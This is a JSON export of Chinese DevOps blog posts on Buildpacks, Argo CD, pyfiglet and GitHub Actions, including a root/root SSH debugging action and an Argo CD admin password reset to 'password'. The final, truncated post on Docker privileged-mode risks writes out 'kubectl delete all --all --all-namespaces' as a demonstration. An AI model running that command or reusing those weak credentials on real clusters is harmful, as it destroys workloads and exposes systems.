Python, Golang, \u0026amp; PHP Paketo Buildpacks: paketobuildpacks/builder:base Ubuntu bionic base image with buildpacks for Java, .NET Core, NodeJS, Go, Ruby, NGINX and Procfile Paketo Buildpacks: paketobuildpacks/builder:full Ubuntu bionic base image with buildpacks for Java, .NET Core, NodeJS, Go, PHP, Ruby, Apache HTTPD, NGINX and Procfile Paketo Buildpacks: paketobuildpacks/builder:tiny Tiny base image (bionic build image, distroless-like run image) with buildpacks for Java Native Image and Go Tip: Learn more about a specific builder with: pack inspect-builder \u0026lt;builder-image\u0026gt; 进行构建, 这里采用 heroku/buildpacks:20 进行构建 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 pack build python-sample --builder heroku/buildpacks:20 20: Pulling from heroku/buildpacks Digest: sha256:128508a60a25ecac8ed16b4507747cceaf627e2617b2e898d98ac303411a010f Status: Image is up to date for heroku/buildpacks:20 20: Pulling from heroku/pack Digest: sha256:6f7301c933d3d0d777c3f5b99b5cc9d8e5ee7304e69b5f05989e19e5c4206a95 Status: Image is up to date for heroku/pack:20 ===\u0026gt; DETECTING ======== Output: heroku/ruby@0.0.1 ======== no err: heroku/ruby@0.0.1 (1) heroku/python 0.3 heroku/procfile 0.6 ===\u0026gt; ANALYZING Previous image with name \u0026#34;python-sample\u0026#34; not found ===\u0026gt; RESTORING ===\u0026gt; BUILDING -----\u0026gt; Installing python-3.6.12 -----\u0026gt; Installing pip 20.1.1, setuptools 47.1.1 and wheel 0.34.2 -----\u0026gt; Installing SQLite3 -----\u0026gt; Installing requirements with pip ! Your Django version is nearing the end of its community support. ! Upgrade to continue to receive security updates and for the best experience with Django. ! For more information, check out https://www.djangoproject.com/download/#supported-versions Collecting Django==1.11.29 Downloading Django-1.11.29-py2.py3-none-any.whl (6.9 MB) Collecting coverage==4.5.4 Downloading coverage-4.5.4-cp36-cp36m-manylinux1_x86_64.whl (205 kB) Collecting pytz Downloading pytz-2021.1-py2.py3-none-any.whl (510 kB) Installing collected packages: pytz, Django, coverage Successfully installed Django-1.11.29 coverage-4.5.4 pytz-2021.1 -----\u0026gt; $ python manage.py collectstatic --noinput 61 static files copied to \u0026#39;/workspace/static\u0026#39;. -----\u0026gt; Discovering process types Procfile declares types -\u0026gt; (none) ===\u0026gt; EXPORTING Adding layer \u0026#39;heroku/python:profile\u0026#39; Adding 1/1 app layer(s) Adding layer \u0026#39;launcher\u0026#39; Adding layer \u0026#39;config\u0026#39; Adding label \u0026#39;io.buildpacks.lifecycle.metadata\u0026#39; Adding label \u0026#39;io.buildpacks.build.metadata\u0026#39; Adding label \u0026#39;io.buildpacks.project.metadata\u0026#39; Warning: default process type \u0026#39;web\u0026#39; not present in list [] *** Images (1de89df98f60): python-sample Adding cache layer \u0026#39;heroku/python:shim\u0026#39; Successfully built image python-sample 查看镜像 1 2 3 docker images |grep python-sample python-sample latest 39a646c853c2 41 years ago 756MB 41 years ago 应该是有 Bug, 镜像有点大。第二次构建时, 并没有看到明显提速, 看来得用自定义 Builder 才能展示上述表格中的优势。\n创建容器试试 1 2 3 4 5 6 7 8 9 10 11 12 docker run --rm -p 8000:8000 python-sample python manage.py runserver 0.0.0.0:8000 Performing system checks... System check identified no issues (0 silenced). You have 13 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): admin, auth, contenttypes, sessions. Run \u0026#39;python manage.py migrate\u0026#39; to apply them. February 04, 2021 - 08:33:02 Django version 1.11.29, using settings \u0026#39;project.settings\u0026#39; Starting development server at http://0.0.0.0:8000/ Quit the server with CONTROL-C. 在 8000 端口访问页面。 5. 总结 本文主要是体验了一下 Buildpacks 在云原生背景下的进化版本 Cloud Native Buildpacks 。\nBuildpacks 与 S2I 一样, 支持开发者自定义 Builder, 也支持用户在源码仓库中自定义一些配置, 比如指定源码目录、指定解释器版本等。PaaS、FaaS 类的平台自己维护一套类似的工具, 不如直接采用并贡献这些开源项目。\n6. 参考 https://buildpacks.io/ https://github.com/GoogleCloudPlatform/buildpacks ","description":"","id":241,"section":"post","tags":["博文","DevOps","Buildpack","容器","镜像"],"title":"老树开新花 - Cloud Native Buildpacks","uri":"https://www.chenshaowen.com/blog/a-sample-intro-to-cloud-native-buildpacks.html"},{"content":"1. Argo CD 能解决什么问题 1.1 从 GitOps 说起 GitOps 起源于 Weaveworks 公司在 2017 年发表的一篇博客， GitOps - Operations by Pull Request 。在文中，Alexis 介绍了一种以 Git 为唯一事实来源的部署方式。\n在 GitOps 实践中，我们需要将软件设施定义在 Git 仓库中进行管理。其中的软件设施，包括 IaaS、Kubernetes 这样的基础设施，也包括应用本身。每个人都可以通过提交 Pull Request 来修改软件设施，然后通过自动化的程序执行这种修改。\n这种方式使得每个人都可以专注于开发新的功能，而不用陷入繁琐的安装、变更、迁移等运维工作。同时，整个过程具有完整的操作记录和权限审批管理。\n1.2 Argo CD 能落地 GitOps Argo CD 是以 Kubernetes 为基础设施的 GitOps 持续部署工具。下面是来自 Argo CD 社区的原理图:\nArgo CD 从 Git Repo 拉取应用的配置，部署在 Kubernetes 集群中。 当有人新增功能时，提交一个 Pull Requests 到 Git Repo 修改应用的部署配置，等待合并。 在 Pull Requests 合并之后，通过 Webhook 触发 Argo CD 执行更新操作。 应用得到更新，发送通知 理解起来很容易，将运维过程自动化，持续的部署。\n1.3 强大而易扩展的 Argo CD 对于一般的 Kubernetes 运维场景，上面描述的功能是够用的。但是如果是复杂场景，涉及多云、多平台、多中间件，也是需要考虑的。\n在 Argo CD 的处理逻辑中，定义了四个组件:\nEvent Source, 接入各种事件消息 Sensor, 将消息转换为触发的动作 Eventbus, 消息订阅路由系统 Trigger, 触发外部的实际动作 对于运维人员，需要了解的主要是两点:\nArgo CD 可以处理什么事件？AMQP、AWS SNS、AWS SQS、Cron Schedules、GCP PubSub、GitHub、GitLab、HDFS、File Based Events、Kafka、Minio、NATS、MQTT、K8s Resources、Slack、NetApp StorageGrid、Webhooks、Stripe、NSQ、Emitter、Redis、Azure Events Hub\nArgo CD 可以处理执行哪些动作？Argo Workflows、Standard K8s Objects、HTTP Requests、AWS Lambda、NATS Messages、Kafka Messages、Slack Notifications、Argo Rollouts CR、Custom / Build Your Own Triggers、Apache OpenWhisk\n2. 在 Kubernetes 上部署 Argo CD 新建命名空间，部署 Argo CD 这里选择当前发布的最新版本: 1.8.3\n1 2 kubectl create namespace argocd kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/v1.8.3/manifests/install.yaml Argo CD 社区还提供了 HA 模式的部署方式，kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/v1.8.3/manifests/ha/install.yaml 用于生产环境。\n将服务改为 NodePort 类型，方便访问 1 kubectl patch svc argocd-server -p \u0026#39;{\u0026#34;spec\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;NodePort\u0026#34;}}\u0026#39; -n argocd 查看服务 1 2 3 4 5 6 7 8 9 kubectl -n argocd get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE argocd-dex-server ClusterIP 10.233.34.191 \u0026lt;none\u0026gt; 5556/TCP,5557/TCP,5558/TCP 5m37s argocd-metrics ClusterIP 10.233.54.3 \u0026lt;none\u0026gt; 8082/TCP 5m36s argocd-redis ClusterIP 10.233.18.86 \u0026lt;none\u0026gt; 6379/TCP 5m36s argocd-repo-server ClusterIP 10.233.3.171 \u0026lt;none\u0026gt; 8081/TCP,8084/TCP 5m36s argocd-server NodePort 10.233.61.3 \u0026lt;none\u0026gt; 80:31808/TCP,443:30992/TCP 5m36s argocd-server-metrics ClusterIP 10.233.36.228 \u0026lt;none\u0026gt; 8083/TCP 5m36s 查看 admin 账户密码 1 2 3 kubectl get pod -n argocd |grep argocd-server argocd-server-7d597d9bcd-6nzct 1/1 Running 0 22m 这里 admin 的密码就是 Pod 的名字: argocd-server-7d597d9bcd-6nzct 。\n登录 Argo CD UI 页面，打开页面 http://{HOST_IP}:31808 使用账户: admin，密码: argocd-server-7d597d9bcd-6nzct 进行登录。\n3. 安装 CLI 工具 下载 CLI 命令行工具 这里以 Linux 为例进行安装:\n1 2 curl -sSL -o /usr/local/bin/argocd https://github.com/argoproj/argo-cd/releases/download/v1.8.3/argocd-linux-amd64 chmod +x /usr/local/bin/argocd 登录 Kubernetes 集群上部署的 Argo CD 将 HOST_IP 替换为主机的 IP 地址，使用 CLI 登录集群。\n1 2 3 4 argocd login {HOST_IP}:31808 --username admin --password argocd-server-7d597d9bcd-6nzct \u0026#39;admin\u0026#39; logged in successfully Context \u0026#39;{HOST_IP}:31808\u0026#39; updated 更新 admin 密码, 方便下次登录 1 2 3 4 argocd account update-password --account admin --current-password argocd-server-7d597d9bcd-6nzct --new-password password Password updated Context \u0026#39;{HOST_IP}:31808\u0026#39; updated 这样 admin 密码就被修改为 password 了。\n4. 使用 CLI 创建一个应用 创建一个应用 可以通过 UI 进行创建应用，但为了能通过复制、粘贴快速体验 Argo CD, 这里通过 CLI 工具进行创建。\n1 argocd app create guestbook --repo https://github.com/argoproj/argocd-example-apps.git --path guestbook --dest-server https://kubernetes.default.svc --dest-namespace default 参数说明:\n- repo, 指定 Git 仓库 - path, 指定部署文件在 Git 仓库中的相对路径 - dest-server, 集群的访问地址 - dest-namespace, 部署到哪个命名空间 这里 https://github.com/argoproj/argocd-example-apps/tree/master/guestbook 目录下，是一个 deployment 和一个 service 的 yaml 声明。\n在页面查看创建的服务 等待一会儿, 查看详情, 可以看到应用的拓扑图。\nkubectl 查看创建的服务 1 2 3 4 5 6 7 8 9 10 11 12 13 kubectl get all -n default NAME READY STATUS RESTARTS AGE pod/guestbook-ui-65b878495d-wjmxh 1/1 Running 0 60s NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/guestbook-ui ClusterIP 10.233.55.230 \u0026lt;none\u0026gt; 80/TCP 61s service/kubernetes ClusterIP 10.233.0.1 \u0026lt;none\u0026gt; 443/TCP 12d NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/guestbook-ui 1/1 1 1 60s NAME DESIRED CURRENT READY AGE replicaset.apps/guestbook-ui-65b878495d 1 1 1 60s 删除应用，清理环境 1 argocd app delete guestbook 不仅应用会在 Argo CD 记录中被删除，相关的负载在 Kubernetes 中也会被删除。\n5. 总结 本文主要介绍了 Argo CD 非常基础的功能，并通过创建应用对其功能进行了演示。\n实际上，Argo CD 的功能并不止于此，比如修改 Git Repo 之后，可以同步到 Kubernetes 中进行更新；修改镜像之后，自动触发更新。从上面的架构图可以看到，通过 Event Source 和 Trigger 可以实现满足很多自动化部署的需求。\n另一方面，在更新 Kubernetes 时，Argo CD 还支持 Kustomize、Helm、Ksonnet、Yaml、Json、自定义扩展的资源描述方式，这在使用上会非常方便。\n6. 参考 https://argoproj.github.io/argo-cd/ ","description":"","id":242,"section":"post","tags":["博文","DevOps","ArgoCD","Kubernetes","CICD"],"title":"DevOps 工具链之 Argo CD","uri":"https://www.chenshaowen.com/blog/argocd-of-devops-tool-chain.html"},{"content":"1. 什么是 pyfiglet pyfiglet 是一个用 Python 实现的 ASCII 艺术字生成工具。可以根据字符生成如下图形:\n1 2 3 4 5 6 _ _ _ _ _ _ | |__ ___| | | ___ __ _____ _ __| | __| | | | \u0026#39;_ \\ / _ \\ | |/ _ \\ \\ \\ /\\ / / _ \\| \u0026#39;__| |/ _` | | | | | | __/ | | (_) | \\ V V / (_) | | | | (_| |_| |_| |_|\\___|_|_|\\___( ) \\_/\\_/ \\___/|_| |_|\\__,_(_) |/ 在编写 CLI 工具时，可以用 pyfiglet 生成 Banner 展示在命令行。\n2. 安装 在 Python 环境下，使用 pip 安装:\n1 pip install pyfiglet 3. 演示使用 先查看一下帮助文档:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 pyfiglet --help Usage: pyfiglet [options] [text..] Options: --version show program\u0026#39;s version number and exit -h, --help show this help message and exit -f FONT, --font=FONT font to render with (default: standard) -D DIRECTION, --direction=DIRECTION set direction text will be formatted in (default: auto) -j SIDE, --justify=SIDE set justification, defaults to print direction -w COLS, --width=COLS set terminal width for wrapping/justification (default: 80) -r, --reverse shows mirror image of output text -F, --flip flips rendered output text over -l, --list_fonts show installed fonts list -i, --info_font show font\u0026#39;s information, use with -f FONT -L LOAD, --load=LOAD load and install the specified font definition -c COLOR, --color=COLOR prints text with passed foreground color, --color=foreground:background --color=:background # only background --color=foreground | foreground: # only foreground --color=list # list all colors COLOR = list[COLOR] | [0-255];[0-255];[0-255] (RGB) 下面直接试试这些参数:\n默认参数 1 2 3 4 5 6 7 pyfiglet Kube _ __ _ | |/ / _| |__ ___ | \u0026#39; / | | | \u0026#39;_ \\ / _ \\ | . \\ |_| | |_) | __/ |_|\\_\\__,_|_.__/ \\___| 居中对齐 1 2 3 4 5 6 pyfiglet Kube -j center _ __ _ | |/ / _| |__ ___ | \u0026#39; / | | | \u0026#39;_ \\ / _ \\ | . \\ |_| | |_) | __/ |_|\\_\\__,_|_.__/ \\___| 指定字体 字体可以在 http://www.figlet.org/fontdb.cgi 查找。\n1 2 3 4 5 6 7 8 9 10 11 12 13 pyfiglet -f isometric3 Kube ___ ___ ___ /__/| /__/\\ _____ / /\\ | |:| \\ \\:\\ / /::\\ / /:/_ | |:| \\ \\:\\ / /:/\\:\\ / /:/ /\\ __| |:| ___ \\ \\:\\ / /:/~/::\\ / /:/ /:/_ /__/\\_|:|____ /__/\\ \\__\\:\\ /__/:/ /:/\\:| /__/:/ /:/ /\\ \\ \\:\\/:::::/ \\ \\:\\ / /:/ \\ \\:\\/:/~/:/ \\ \\:\\/:/ /:/ \\ \\::/~~~~ \\ \\:\\ /:/ \\ \\::/ /:/ \\ \\::/ /:/ \\ \\:\\ \\ \\:\\/:/ \\ \\:\\/:/ \\ \\:\\/:/ \\ \\:\\ \\ \\::/ \\ \\::/ \\ \\::/ \\__\\/ \\__\\/ \\__\\/ \\__\\/ 设置颜色 1 pyfiglet -f isometric3 -c BLUE Kube 1 pyfiglet -f isometric3 -c RED Kube 除此，还可以通过 from pyfiglet import Figlet 的方式，在 Python 代码中渲染字体。\n","description":"","id":243,"section":"post","tags":["博文","命令","前端","NPM"],"title":"命令行 Banner 生成工具 - pyfiglet","uri":"https://www.chenshaowen.com/blog/cli-banner-tool-pyfiglet.html"},{"content":"1. 一个令人困惑的问题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 name: Go on: [push, pull_request] jobs: build: name: CI runs-on: ubuntu-latest steps: - name: Set up Go 1.13 uses: actions/setup-go@v1 with: go-version: 1.13 - name: Check out code into the Go module directory uses: actions/checkout@v2 - name: Check pr is properly formatted run: diff -u \u0026lt;(echo -n) \u0026lt;(gofmt -d ./pkg ./cmd ./tools ./test) - name: Test \u0026amp; Build run: make all 上面是项目中 workflow 的一部分, 主要用来检测代码风格、执行单元测试、编译代码。提交 Pull Requests 时, 就会触发执行。\n但 GitHub Actions 一直报错, 提示如下:\n1 Error: vet: pkg/kapis/cluster/v1alpha1/handler_test.go:405:87: too few arguments in call to informers.NewInformerFactories 问题的关键在于, 本地执行没有任何报错。刚开始怀疑是 GitHub Actions 不够稳定, 可能存在抖动。于是, 反复推送, 但是错误依旧。\n2. 线上调试 直接祭出了杀手锏, 登录 Ngrok 拿到 Authtoken 配置到 Secrets 中。然后, 添加如下片段至失败的任务之前:\n1 2 3 4 5 6 - uses: shaowenchen/debugger-action@v2 name: debugger timeout-minutes: 30 continue-on-error: true with: ngrok_token: ${{ secrets.NGROK_TOKEN }} 在 Actions 的执行日志中, 找到 SSH 登录链接。执行命令, 远程登录 Runner 进行调试：\n1 ssh root@@0.tcp.ngrok.io -p 17656 输入密码 root, 即可在线调试。可是, 还是提示同样的错误, 只能另想办法。\n3. 日志中发现端倪 根据错误, 我猜测是代码缓存、同步之类的问题。于是, 翻了下 Actions 的完整日志, 终于发现了端倪。\n1 2 3 Checking out the ref /usr/bin/git log -1 --format=\u0026#39;%H\u0026#39; \u0026#39;0f878e746fe9ce55a6c4b793c66f501c14c456f5\u0026#39; 日志中的一个 SHA 值引起了我的注意, 因为之前在 Jenkins 中碰到过一个 Git 记录找不到的问题。一个 SHA 就代表着一个版本记录。\n然后, 我在本地 git checkout -f 0f878e746fe9ce55a6c4b793c66f501c14c456f5, 竟然提示找不到这条记录。将折叠的 Checking out the ref 日志展开:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Checking out the ref /usr/bin/git checkout --progress --force refs/remotes/pull/3254/merge Note: switching to \u0026#39;refs/remotes/pull/3254/merge\u0026#39;. You are in \u0026#39;detached HEAD\u0026#39; state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by switching back to a branch. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -c with the switch command. Example: git switch -c \u0026lt;new-branch-name\u0026gt; Or undo this operation with: git switch - Turn off this advice by setting config variable advice.detachedHead to false HEAD is now at 0f878e7 Merge 2ecc7398161e7a0211c59b52061c9e3800d28551 into 38eaa5cde0580ac4d29537065b687e090db557c6 Merge 2ecc7398161e7a0211c59b52061c9e3800d28551 into 38eaa5cde0580ac4d29537065b687e090db557c6, 原来 actions/checkout 默认将 Pull Requests 分支的代码合并到最新代码上, 产生了一条新记录。\n问题的原因找到了, 研发在 fork 主干代码之后, 开发新的功能。但是在这个过程中, 主干分支已经合并了其他人的代码。当已经合并的代码与 Pull Requests 中的代码有冲突时, 就会导致这种现象。\n解决问题的办法就是, 每次提交 Pull Requests 之前, 都重新拉取一次 upstream 的代码, 接着 rebase 解决冲突, 再提交。这里的冲突有两类, 一个是文件冲突, 另一种是功能冲突。\n4. action/checkout 的参数解读 下面, 我们继续来看一看 action/checkout 的其他参数和功能。\nfetch-depth 默认值为 1, 仅拉取当前分支。设置为 0 时, 拉取全部分支和 Tag 的记录。 1 2 3 - uses: actions/checkout@v2 with: fetch-depth: 0 checkout 多个仓库的代码到指定目录 1 2 3 4 5 6 7 8 - name: Checkout uses: actions/checkout@v2 - name: Checkout tools repo uses: actions/checkout@v2 with: repository: my-org/my-tools path: my-tools checkout 到提交 Pull Requests 的记录上, 默认是 merge 之后的记录 1 2 3 - uses: actions/checkout@v2 with: ref: ${{ github.event.pull_request.head.sha }} ","description":"","id":244,"section":"post","tags":["博文","GitHub","Actions","CICD"],"title":"本地执行没问题, GitHub Actions 却一直报错","uri":"https://www.chenshaowen.com/blog/local-is-fine-but-error-in-github-actions.html"},{"content":"\n如果你已经在使用 GitHub Actions ，那么阅读本文你将获得更多有趣而有用的打开方式。阅读完，我又给仓库新增了几个 workflow 。\n1. workflow 执行时，传入参数 在执行 workflow 时, 允许在 GitHub Actions 页面输入参数，控制执行逻辑。我们可以将人工处理的逻辑，在 GitHub Actions 参数化执行，适用于持续部署场景。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 on: workflow_dispatch: inputs: logLevel: description: \u0026#34;Log level\u0026#34; required: true default: \u0026#34;warning\u0026#34; tags: description: \u0026#34;Test scenario tags\u0026#34; jobs: printInputs: runs-on: ubuntu-latest steps: - run: | echo \u0026#34;Log level: ${{ github.event.inputs.logLevel }}\u0026#34; echo \u0026#34;Tags: ${{ github.event.inputs.tags }}\u0026#34; 上面的 workflow 执行时，会弹出如下对话框。\n2. Job 编排控制执行顺序 一个 workflow 由很多个 job 组成，借助于 needs 参数，我们可以管理这些 job 之间的依赖，控制其执行流程。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 on: push jobs: job1: runs-on: ubuntu-latest steps: - run: echo \u0026#34;job1\u0026#34; job2: runs-on: ubuntu-latest steps: - run: sleep 5 needs: job1 job3: runs-on: ubuntu-latest steps: - run: sleep 10 needs: job1 job4: runs-on: ubuntu-latest steps: - run: echo \u0026#34;job4\u0026#34; needs: [job2, job3] 上面的 workflows 执行时，job2 和 job3 会等 job1 执行成功时才执行，job4 会等 job2 和 job3 执行成功时才执行。\n3. 用于项目管理 Kubernetes 基于 ChatOps 使用 Prow 协调社区有序协作。但并不是每个团队，都愿意搭建并维护一套 Prow 机器人系统。ChatOps 实现的核心是事件驱动，这在 GitHub 中使用 Actions 也能实现。\n下面是几个项目管理相关的 action\n根据修改的目录添加标签 1 2 3 - uses: actions/labeler@main with: repo-token: \u0026#34;${{ secrets.GITHUB_TOKEN }}\u0026#34; 在配置文件 .github/workflows/labeler.yml 中添加规则，给对 docs 目录进行修改的 Pull Requests(以下简称 PR) 自动添加 docs_label 标签:\n1 2 docs_label: - ./docs/* 根据标签添加 Issues 到 Projects 使用 srggrs/assign-one-project-github-action , 我们可以将新增的 Issues 或者 PR 添加到指定的 Projects 中。\n1 2 3 4 5 - name: Assign NEW issues and NEW pull requests to project 2 uses: srggrs/assign-one-project-github-action@1.2.0 if: github.event.action == \u0026#39;opened\u0026#39; with: project: \u0026#34;https://github.com/srggrs/assign-one-project-github-action/projects/2\u0026#34; 也可以将包含指定标签的 Issues 或 PR 添加到指定 Project 的指定 Column 中。\n1 2 3 4 5 6 7 8 - name: Assign issues and pull requests with `bug` label to project 3 uses: srggrs/assign-one-project-github-action@1.2.0 if: | contains(github.event.issue.labels.*.name, \u0026#39;bug\u0026#39;) || contains(github.event.pull_request.labels.*.name, \u0026#39;bug\u0026#39;) with: project: \u0026#34;https://github.com/srggrs/assign-one-project-github-action/projects/3\u0026#34; column_name: \u0026#34;Labeled\u0026#34; 清理长时间无人跟进的 Issues 如果一个 Issue 长达 30 天没有更新，那么下面的 workflow 将会再等 5 天，然后将其关闭。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 name: \u0026#34;Close stale issues and PRs\u0026#34; on: schedule: - cron: \u0026#34;30 1 * * *\u0026#34; jobs: stale: runs-on: ubuntu-latest steps: - uses: actions/stale@v3 with: stale-issue-message: \u0026#34;This issue is stale because it has been open 30 days with no activity. Remove stale label or comment or this will be closed in 5 days.\u0026#34; days-before-stale: 30 days-before-close: 5 GitHub 上的项目管理，主要是围绕 Issues、Projects、Labels、Pull Requests 展开，可以在 GitHub Actions 的 Marketplace 中搜索相关的 Action 使用。\n4. 在线调试 在使用 GitHub Actions 的过程中，如果需要登录到 Runner 上调试命令，那么下面这个技巧你一定会感兴趣。\n1 2 3 4 5 6 - uses: shaowenchen/debugger-action@v2 name: debugger timeout-minutes: 30 continue-on-error: true with: ngrok_token: ${{ secrets.NGROK_TOKEN }} 只需要去 Ngrok 官网申请一个 token，就可以通过 ssh 远程登录到 Runner。当然，也可以暴露 Runner 上的服务，提供外网访问的链接，最长可达 6 小时。\n在执行日志中，我们可以找到 ssh 的登录链接，使用 root/root 即可登录 Runner。如果配置了 web 的端口映射，还可以查看到相关的服务链接。\n5. 设置缓存 缓存能有效地加快构建速度，减少网络请求，复用中间码。这对于 Java、Nodejs、Python 等项目，非常有用。\n1 2 3 4 5 6 7 8 9 10 11 - name: Get yarn cache directory path id: yarn-cache-dir-path run: echo \u0026#34;::set-output name=dir::$(yarn cache dir)\u0026#34; - uses: actions/cache@v2 id: yarn-cache # use this to check for `cache-hit` (`steps.yarn-cache.outputs.cache-hit != \u0026#39;true\u0026#39;`) with: path: ${{ steps.yarn-cache-dir-path.outputs.dir }} key: ${{ runner.os }}-yarn-${{ hashFiles(\u0026#39;**/yarn.lock\u0026#39;) }} restore-keys: | ${{ runner.os }}-yarn- 6. 检测项目中的问题链接 项目维护时间长了之后，最令人头疼的就是文档。研发、测试跟进的是代码、功能，而文档却时常无人更新。缺少维护的文档，会让潜在参与者流失。下面这个 Action 能检测文档中的 Broken 链接。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 name: Check Markdown links on: push jobs: markdown-link-check: runs-on: ubuntu-latest steps: - uses: actions/checkout@master - uses: gaurav-nelson/github-action-markdown-link-check@v1 with: use-quiet-mode: \u0026#34;yes\u0026#34; config-file: \u0026#34;.github/workflows/checklink_config.json\u0026#34; max-depth: 3 gaurav-nelson/github-action-markdown-link-check 支持自定义配置，非常灵活易用，堪称必备 Action。\n下面是一个 .github/workflows/checklink_config.json 的示例：\n1 2 3 4 5 6 7 8 9 { \u0026#34;replacementPatterns\u0026#34;: [ { \u0026#34;pattern\u0026#34;: \u0026#34;^/\u0026#34;, \u0026#34;replacement\u0026#34;: \u0026#34;/github/workspace/\u0026#34; } ], \u0026#34;aliveStatusCodes\u0026#34;: [429, 200] } 最后在 GitHub Actions 日志页面，会输出这样的检测结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 =========================\u0026gt; MARKDOWN LINK CHECK \u0026lt;========================= FILE: ./docs/governance.md 4 links checked. FILE: ./docs/configuration/cri.md [✖] https://build.opensuse.org/project/show/devel:kubic:libcontainers:stable 7 links checked. ERROR: 1 dead links found! [✖] https://build.opensuse.org/project/show/devel:kubic:libcontainers:stable → Status: 404 FILE: ./docs/configuration/kubeedge.md 21 links checked. ========================================================================= 7. Job 批量执行，参数排列组合执行任务 数据驱动测试的场景下，可以通过输入的参数控制测试的流程。在 GitHub Actions 中，我们也可以通过参数化的方式，批量地执行或编排流程。\nGitHub Actions 会将 matrix 中的每个参数排列组合，产生一个新的运行实例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 on: push jobs: node: runs-on: ${{ matrix.os }} strategy: matrix: os: [ubuntu-16.04, ubuntu-18.04] node: [6, 8, 10] steps: - uses: actions/setup-node@v1 with: node-version: ${{ matrix.node }} - run: node --version 上面的 workflow 执行时, 会执行 6 个 job。\n无论是用来测试兼容性, 还是批量执行 Job, 都是非常好的。\n8. 拷贝 Action 的 Badge 状态显示在文档中 通常，我们使用 GitHub Actions 对项目进行代码分析、执行测试、编译、打包、构建、推送镜像等。这些行为对于保证项目的稳定，至关重要。\n但并不是每个人都会关注 Actions 的执行细节。我们可以在显眼的地方，给出这些过程的最终实时状态，以提醒用户和开发者。如果 main 分支构建失败了，能提醒用户谨慎使用，能提醒研发尽快修复问题。\n在 GitHub Actions 页面中, 点击 Create status badge。\n将弹框中的 URL 链接，增加在 Readme 文档中，即可实时快速地查看到 workflow 的执行结果。\n9. 精准 hook GitHub 上的行为 workflow 通过 on 关键字定义触发条件。 主要有三类触发事件:\n人工触发 1 on: workflow_dispatch 定时触发 每隔 15 分钟触发一次 workflows。\n1 2 3 on: schedule: - cron: \u0026#34;*/15 * * * *\u0026#34; Webhook 触发 我们在 GitHub 上的操作，比如创建 Issues、新增 Deployment 等，都能够通过 API 获取到相关的事件。通过这些事件，我们可以精准地定制 workflow 的行为。通常我们都是基于 push 或者 pull requests 触发，下面列举几个不常见的示例：\n当有人 fork 仓库时触发\n1 on: fork 当有人 star 仓库时触发\n1 2 3 on: watch: types: [started] 当有新建的 Issue 时触发\n1 2 3 on: issues: types: [opened] 10. 开发一个 Action 很简单 如果在 Marketplace 找不到合适的 Action，那么自己开发 Action 也是一个不错的选择。\n其实，开发一个 Action 没有想象中那么难。一个 Action 就是一个处理逻辑，接收输入参数，执行一定的逻辑，然后输出参数。有三种类型的 Action:\nDocker container, 适用 Linux 系统 通过 Docker 容器，提供 Action 的执行逻辑处理。比如下面这个例子:\nDockerfile\n1 2 3 4 5 FROM appleboy/drone-scp:1.6.2-linux-amd64 ADD entrypoint.sh /entrypoint.sh RUN chmod +x /entrypoint.sh ENTRYPOINT [\u0026#34;/entrypoint.sh\u0026#34;] entrypoint.sh\n1 2 3 4 5 6 7 #!/bin/sh set -eu [ -n \u0026#34;$INPUT_STRIP_COMPONENTS\u0026#34; ] \u0026amp;\u0026amp; export INPUT_STRIP_COMPONENTS=$((INPUT_STRIP_COMPONENTS + 0)) sh -c \u0026#34;/bin/drone-scp $*\u0026#34; 通过 dron-scp 镜像，快速开发了一个提供 scp 文件拷贝的 Action。\nJavaScript, 适用 Linux、macOS、Windows 系统 通过执行 JavaScript 处理 Action 逻辑。官方提供了 JavaScript 和 TypeScript 的 Action 模板。在创建项目时，使用模板创建，然后编写处理逻辑，发布自己的 Action 即可。\nGitHub Actions 提供了工具包，以支持这种方式的扩展，例如执行命令、操作 GitHub 等，都可以通过引用包，直接调用相关函数实现。下面是其中几个工具包：\n@actions/exec, 执行命令 @actions/core, 输入、输出、日志、秘钥相关 @actions/io, 操作文件 Composite run steps, 适用 Linux, macOS, Windows 系统 这种类型，允许将一连串的 Shell 操作作为一个 Action 使用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 name: \u0026#34;Hello World\u0026#34; description: \u0026#34;Greet someone\u0026#34; inputs: who-to-greet: # id of input description: \u0026#34;Who to greet\u0026#34; required: true default: \u0026#34;World\u0026#34; outputs: random-number: description: \u0026#34;Random number\u0026#34; value: ${{ steps.random-number-generator.outputs.random-id }} runs: using: \u0026#34;composite\u0026#34; steps: - run: echo Hello ${{ inputs.who-to-greet }}. shell: bash - id: random-number-generator run: echo \u0026#34;::set-output name=random-id::$(echo $RANDOM)\u0026#34; shell: bash - run: ${{ github.action_path }}/goodbye.sh shell: bash 11. 参考 https://github.com/actions/typescript-action https://github.com/shaowenchen/debugger-action ","description":"","id":245,"section":"post","tags":["博文","GitHub","Actions","CICD","DevOps"],"title":"10 个你该了解的 GitHub Actions 进阶技巧","uri":"https://www.chenshaowen.com/blog/10-tips-of-github-action.html"},{"content":"\n本文档主要用于展示 Docker 特权模式的危害，请谨慎操作。对于没有 CLI 操作权限的用户，可以拷贝示例的 Yaml，直接创建集群负载 Pod、Job、DaemonSet 等进行操作。\n1. 直接删除全部资源 如果能登陆机器，收拾好东西，执行命令:\n1 kubectl delete all --all --all-namespaces 